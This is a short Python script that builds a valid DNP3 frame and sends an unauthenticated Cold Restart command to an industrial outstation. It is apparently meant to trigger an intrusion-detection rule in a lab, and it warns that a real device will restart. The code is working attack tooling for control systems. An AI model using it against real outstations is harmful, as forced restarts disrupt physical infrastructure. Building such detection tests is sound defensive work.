#!/usr/bin/env python3
"""
Send one DNP3 Cold Restart request (function 0x0D) to a lab outstation.
Target for TechDetechtives rule 1900121. LAB USE ONLY: a real outstation restarts.

  python3 dnp3_cold_restart.py <outstation IP> [--port 20000] [--dst 10] [--src 1]

Standard library only. Builds a valid link-layer frame with DNP3 CRCs so the
sensor's DNP3 parser decodes the function code.
"""
import argparse
import socket
import struct


def crc_dnp(data: bytes) -> int:
    crc = 0
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = (crc >> 1) ^ 0xA6BC if crc & 1 else crc >> 1
    return (~crc) & 0xFFFF


def with_crc(block: bytes) -> bytes:
    return block + struct.pack("<H", crc_dnp(block))


def cold_restart_frame(dst: int, src: int, seq: int = 0) -> bytes:
    transport = 0xC0 | (seq & 0x3F)          # FIR | FIN
    app_ctrl = 0xC0 | (seq & 0x0F)           # FIR | FIN
    user = bytes([transport, app_ctrl, 0x0D])  # 0x0D = COLD_RESTART
    length = 5 + len(user)                   # ctrl + dst + src + user data
    header = struct.pack("<BBBBHH", 0x05, 0x64, length, 0xC4, dst, src)  # DIR|PRM, unconfirmed user data
    frame = with_crc(header)
    for i in range(0, len(user), 16):
        frame += with_crc(user[i:i + 16])
    return frame


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("host")
    ap.add_argument("--port", type=int, default=20000)
    ap.add_argument("--dst", type=int, default=10, help="outstation address")
    ap.add_argument("--src", type=int, default=1, help="master address")
    a = ap.parse_args()
    frame = cold_restart_frame(a.dst, a.src)
    with socket.create_connection((a.host, a.port), timeout=10) as s:
        s.sendall(frame)
    print(f"sent DNP3 Cold Restart ({len(frame)} bytes) to {a.host}:{a.port}: {frame.hex(' ')}")


if __name__ == "__main__":
    main()
